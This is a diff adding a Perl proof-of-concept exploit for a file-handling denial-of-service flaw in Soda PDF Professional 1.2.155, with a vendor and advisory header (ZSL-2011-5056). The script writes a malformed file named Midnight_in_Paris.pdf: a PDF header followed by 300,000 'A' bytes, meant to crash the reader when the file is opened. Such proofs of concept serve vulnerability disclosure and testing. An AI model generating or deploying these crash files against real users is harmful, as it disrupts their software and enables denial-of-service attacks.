@@ -1,0 +1,45 @@
+#!/usr/bin/perl
+#
+#
+# Soda PDF Professional 1.2.155 PDF/WWF File Handling Restriction of Service (RoS)
+#
+#
+# Vendor: LULU software
+# Product web page: http://www.sodapdf.com
+# Affected version: 1.2.155.1729 (Professional with OCR)
+#
+# Summary: Increase your efficiency with Soda PDF Professional, the smart
+# & simple tool for opening, creating, editing, converting, and securing
+# PDF files in a collaborative environment. Save time by using powerful
+# automated features like batch PDF creation, professional templates &
+# document comparison.
+#
+# Desc: Soda PDF Pro suffers from a restriction of service (RoS) vulnerability
+# when handling PDF or WWF file formats which can be exploited by malicious
+# people to cause a denial of service scenario.
+#
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# liquidworm gmail com
+#
+#
+# Advisory ID: ZSL-2011-5056
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5056.php
+#
+#
+# 10.11.2011
+#
+
+
+use strict;
+
+my $file = "Midnight_in_Paris.pdf"; # or .wwf
+my $tovar = "\x25\x50\x44\x46\x0A"."\x41" x 300000;
+print "\n\n[*] Creating $file file...\n";
+open ZSL, ">./$file" || die "\nCan't open $file: $!";
+print ZSL $tovar;
+print "\n[.] File successfully mounted!\n\n";
+close ZSL;
